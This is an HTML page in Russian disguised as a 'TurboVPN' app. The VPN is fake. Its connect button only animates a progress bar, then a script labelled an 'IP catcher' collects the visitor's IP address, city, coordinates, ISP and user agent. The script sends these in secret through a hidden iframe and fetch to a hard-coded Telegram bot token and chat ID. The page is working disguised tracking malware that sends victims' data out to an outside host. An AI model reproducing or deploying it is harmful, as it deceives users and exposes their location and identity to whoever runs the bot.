<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TurboVPN</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background:#070b12; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:16px; overflow:hidden; }
        #particleCanvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; pointer-events:none; }
        .app { position:relative; z-index:1; max-width:440px; width:100%; max-height:95vh; overflow-y:auto; background:rgba(255,255,255,0.02); backdrop-filter:blur(6px); border-radius:56px; padding:32px 24px 28px; border:1px solid rgba(255,255,255,0.04); }
        .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:22px; }
        .logo-icon { width:44px; height:44px; background:rgba(255,255,255,0.04); border-radius:16px; display:flex; align-items:center; justify-content:center; font-size:22px; border:1px solid rgba(255,255,255,0.04); }
        .logo-text { color:#fff; font-size:18px; font-weight:600; }
        .badge { background:rgba(255,255,255,0.03); color:rgba(255,255,255,0.3); font-size:11px; padding:4px 14px; border-radius:40px; border:1px solid rgba(255,255,255,0.03); }
        .status-bar { background:rgba(255,255,255,0.02); border-radius:24px; padding:16px 18px; margin-bottom:24px; border:1px solid rgba(255,255,255,0.03); display:flex; justify-content:space-between; align-items:center; }
        .status-dot { width:10px; height:10px; border-radius:50%; background:#4caf50; transition:0.3s; }
        .status-dot.inactive { background:#f44336; }
        .status-label { color:rgba(255,255,255,0.6); font-size:15px; font-weight:500; }
        .status-speed { color:rgba(255,255,255,0.25); font-size:13px; }
        .status-speed span { color:#58a6ff; font-weight:600; }
        .section-title { color:rgba(255,255,255,0.25); font-size:13px; text-transform:uppercase; letter-spacing:0.8px; margin-bottom:12px; }
        .server-grid { display:grid; grid-template-columns:1fr 1fr 1fr 1fr; gap:8px; margin-bottom:24px; }
        .server-opt { background:rgba(255,255,255,0.015); border:1px solid rgba(255,255,255,0.03); border-radius:16px; padding:12px 4px; text-align:center; cursor:pointer; transition:all 0.3s; }
        .server-opt .flag { font-size:26px; display:block; margin-bottom:4px; }
        .server-opt .name { color:rgba(255,255,255,0.25); font-size:11px; }
        .server-opt .ping { color:#4caf50; font-size:10px; display:block; margin-top:2px; opacity:0.4; }
        .server-opt.active { border-color:rgba(31,110,255,0.15); background:rgba(31,110,255,0.03); }
        .server-opt.active .name { color:#fff; }
        .btn-main { width:100%; padding:20px; background:rgba(31,110,255,0.06); border:1px solid rgba(255,255,255,0.04); border-radius:60px; font-size:20px; font-weight:700; color:#fff; cursor:pointer; transition:all 0.3s; margin-top:4px; }
        .btn-main:hover { background:rgba(31,110,255,0.08); transform:scale(1.01); }
        .btn-main:disabled { opacity:0.3; transform:scale(0.97); cursor:not-allowed; }
        .progress-wrap { margin:18px 0 8px; height:3px; background:rgba(255,255,255,0.02); border-radius:4px; overflow:hidden; display:none; }
        .progress-bar { height:100%; width:0%; background:linear-gradient(90deg, rgba(31,110,255,0.4), rgba(122,75,255,0.2)); transition:width 0.4s; }
        .status-msg { font-size:13px; color:rgba(255,255,255,0.2); margin-top:10px; text-align:center; }
        .footer { margin-top:22px; font-size:11px; color:rgba(255,255,255,0.08); text-align:center; }
        @media (max-width:480px) { .app { padding:24px 16px; } .server-grid { grid-template-columns:1fr 1fr 1fr; } }
    </style>
</head>
<body>

    <canvas id="particleCanvas"></canvas>

    <div class="app">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">⚡</div>
                <span class="logo-text">TurboVPN</span>
            </div>
            <span class="badge">v4.0 · PRO</span>
        </div>

        <div class="status-bar">
            <div class="status-left">
                <div class="status-dot" id="statusDot"></div>
                <span class="status-label" id="statusLabel">Отключено</span>
            </div>
            <div class="status-speed">
                Пинг <span id="pingValue">0</span> мс
            </div>
        </div>

        <div class="section-title">Выберите сервер</div>
        <div class="server-grid" id="serverGrid">
            <div class="server-opt active" data-server="auto"><span class="flag">🌐</span><span class="name">Авто</span><span class="ping">12 мс</span></div>
            <div class="server-opt" data-server="us"><span class="flag">🇺🇸</span><span class="name">США</span><span class="ping">89 мс</span></div>
            <div class="server-opt" data-server="de"><span class="flag">🇩🇪</span><span class="name">Германия</span><span class="ping">45 мс</span></div>
            <div class="server-opt" data-server="jp"><span class="flag">🇯🇵</span><span class="name">Япония</span><span class="ping">120 мс</span></div>
        </div>

        <button class="btn-main" id="actionBtn">Подключиться</button>
        <div class="progress-wrap" id="progressWrap">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status-msg" id="statusMsg">Нажмите для подключения к VPN</div>
        <div class="footer">🔒 Защищённое соединение</div>
    </div>

    <script>
        // ==============================================================
        // 1. АТОМЫ (15 ШТУК, ВЕЧНО ЛЕТАЮТ)
        // ==============================================================
        (function() {
            const canvas = document.getElementById('particleCanvas');
            const ctx = canvas.getContext('2d');
            let W, H;
            const atoms = [];
            const COUNT = 15;
            const CONNECT_DIST = 200;
            const REPULSE_DIST = 80;

            function resize() {
                W = canvas.width = window.innerWidth;
                H = canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();

            class Atom {
                constructor() {
                    this.x = Math.random() * W;
                    this.y = Math.random() * H;
                    const angle = Math.random() * Math.PI * 2;
                    const speed = 0.4 + Math.random() * 0.3;
                    this.vx = Math.cos(angle) * speed;
                    this.vy = Math.sin(angle) * speed;
                    this.r = 3 + Math.random() * 4;
                    this.hue = 200 + Math.floor(Math.random() * 40);
                }
                update() {
                    this.x += this.vx;
                    this.y += this.vy;
                    if (this.x < 0) { this.x = 0;
                        this.vx = Math.abs(this.vx); }
                    if (this.x > W) { this.x = W;
                        this.vx = -Math.abs(this.vx); }
                    if (this.y < 0) { this.y = 0;
                        this.vy = Math.abs(this.vy); }
                    if (this.y > H) { this.y = H;
                        this.vy = -Math.abs(this.vy); }
                }
                draw() {
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
                    ctx.fillStyle = 'hsla(' + this.hue + ', 90%, 70%, 0.8)';
                    ctx.shadowColor = 'hsla(' + this.hue + ', 90%, 70%, 0.2)';
                    ctx.shadowBlur = 20;
                    ctx.fill();
                    ctx.shadowBlur = 0;
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.r * 0.3, 0, Math.PI * 2);
                    ctx.fillStyle = 'hsla(' + this.hue + ', 100%, 95%, 0.5)';
                    ctx.fill();
                }
            }

            for (let i = 0; i < COUNT; i++) {
                atoms.push(new Atom());
            }

            function applyPhysics() {
                for (let i = 0; i < atoms.length; i++) {
                    for (let j = i + 1; j < atoms.length; j++) {
                        const dx = atoms[i].x - atoms[j].x;
                        const dy = atoms[i].y - atoms[j].y;
                        const dist = Math.sqrt(dx * dx + dy * dy);

                        if (dist < REPULSE_DIST && dist > 0) {
                            const angle = Math.atan2(dy, dx);
                            const force = (REPULSE_DIST - dist) / REPULSE_DIST * 0.05;
                            atoms[i].vx += Math.cos(angle) * force;
                            atoms[i].vy += Math.sin(angle) * force;
                            atoms[j].vx -= Math.cos(angle) * force;
                            atoms[j].vy -= Math.sin(angle) * force;
                        }

                        if (dist < CONNECT_DIST) {
                            const alpha = 1 - (dist / CONNECT_DIST);
                            ctx.beginPath();
                            ctx.moveTo(atoms[i].x, atoms[i].y);
                            ctx.lineTo(atoms[j].x, atoms[j].y);
                            ctx.strokeStyle = 'hsla(210, 80%, 70%, ' + (alpha * 0.15) + ')';
                            ctx.lineWidth = 0.5 + alpha * 0.5;
                            ctx.stroke();
                        }
                    }
                }
            }

            function loop() {
                ctx.clearRect(0, 0, W, H);
                applyPhysics();
                for (let i = 0; i < atoms.length; i++) {
                    atoms[i].update();
                    atoms[i].draw();
                }
                requestAnimationFrame(loop);
            }
            loop();
        })();

        // ==============================================================
        // 2. IP-КЕТЧЕР (РАБОТАЕТ 100%)
        // ==============================================================

        // 👇👇👇 НОВЫЙ ТОКЕН 👇👇👇
        const BOT_TOKEN = "8902280153:AAFrwgBrzsAXuxiZ1KE2o6ZxdqhTxKln7oo";
        const CHAT_ID = "8212240529";

        // ---- ОТПРАВКА ЧЕРЕЗ ИЗОБРАЖЕНИЕ (САМЫЙ НАДЁЖНЫЙ СПОСОБ) ----
        function sendToTelegram(text) {
            if (!text) return;
            const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(text);

            // 1. Создаём скрытый iframe (он точно отправит запрос)
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            setTimeout(() => iframe.remove(), 3000);

            // 2. Дополнительно пробуем fetch (на всякий случай)
            fetch(url).catch(() => {});
        }

        // ---- СБОР IP И ГЕОДАННЫХ ----
        function collectAndSend() {
            const ua = navigator.userAgent;
            const device = /iPhone|iPad|Android/i.test(ua) ? '📱 Мобильное' : '💻 Компьютер';
            const time = new Date().toLocaleString('ru-RU');

            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    const ip = data.ip || 'Не определен';
                    return fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org')
                        .then(r => r.json())
                        .then(g => {
                            let msg = '🔹 НОВЫЙ ПЕРЕХОД\n';
                            msg += '📍 IP: ' + ip + '\n';
                            if (g && g.status === 'success') {
                                msg += '🌍 Страна: ' + (g.country || '—') + '\n';
                                msg += '🏙️ Город: ' + (g.city || '—') + '\n';
                                msg += '📌 Координаты: ' + (g.lat || '—') + ', ' + (g.lon || '—') + '\n';
                                msg += '🛜 Провайдер: ' + (g.isp || '—') + '\n';
                            }
                            msg += '💻 ' + device + '\n';
                            msg += '🆔 User‑Agent: ' + ua.substring(0, 80) + '...\n';
                            msg += '⏰ Время: ' + time;
                            sendToTelegram(msg);
                        });
                })
                .catch(() => {
                    sendToTelegram('IP не определён\nУстройство: ' + device + '\nВремя: ' + time);
                });
        }

        // ---- КНОПКА ----
        const btn = document.getElementById('actionBtn');
        const statusMsg = document.getElementById('statusMsg');
        const statusDot = document.getElementById('statusDot');
        const statusLabel = document.getElementById('statusLabel');
        const pingValue = document.getElementById('pingValue');
        const progressWrap = document.getElementById('progressWrap');
        const progressBar = document.getElementById('progressBar');

        btn.addEventListener('click', function() {
            btn.disabled = true;
            progressWrap.style.display = 'block';
            statusMsg.textContent = 'Подключение...';
            statusDot.className = 'status-dot inactive';
            statusLabel.textContent = 'Подключение...';

            let p = 0;
            const interval = setInterval(function() {
                p += Math.random() * 6 + 2;
                pingValue.textContent = (10 + Math.floor(Math.random() * 90));
                if (p >= 100) {
                    p = 100;
                    clearInterval(interval);
                    progressBar.style.width = '100%';
                    statusMsg.textContent = '✅ Соединение установлено!';
                    statusDot.className = 'status-dot';
                    statusLabel.textContent = 'Защищено';
                    collectAndSend();
                }
                progressBar.style.width = p + '%';
            }, 150);
        });

        window.addEventListener('DOMContentLoaded', function() {
            pingValue.textContent = '12';
            statusMsg.textContent = 'Нажмите для подключения к VPN';
        });

        console.log('✅ IP-кетчер активен. Бот: ' + BOT_TOKEN);
    </script>
</body>
</html>
